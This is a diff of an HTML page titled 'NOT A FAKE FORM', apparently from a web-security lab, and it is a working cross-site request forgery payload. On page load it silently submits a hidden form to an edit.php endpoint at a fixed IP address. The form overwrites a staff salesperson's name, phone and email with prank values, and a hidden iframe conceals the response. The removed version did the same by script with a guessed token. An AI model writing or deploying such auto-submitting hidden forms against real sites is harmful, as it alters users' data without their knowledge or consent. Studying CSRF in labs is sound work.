@@ -1,19 +1,15 @@
+
 <html>
   <head>
     <title>NOT A FAKE FORM</title>
   </head>
-  <body>
-
-    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="csrfForm" style="display: none;">
-      <input type="text" name="csrf_token" value="csrftoken1" />
-      <input type="text" name="first_name" value="csrftest" />
-      <input type="text" name="last_name" value="one" />
-      <input type="text" name="phone" value="123-456-7890" />
-      <input type="text" name="email" value="test1@" />
-      <input type="submit" name="submit" value="Update"  />
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="TROLLEDDDD" />
+      <input type="text" name="last_name" value="SORRY_Mr.Barker" />
+      <input type="text" name="phone" value="777-777-7777" />
+      <input type="text" name="email" value="TROLLED@TORLLED.COM" />
     </form>
-     <script>
-         document.csrfForm.submit();
-      </script>
+    <iframe name="hidden_results" style="display: none;"></iframe>
   </body>
 </html>
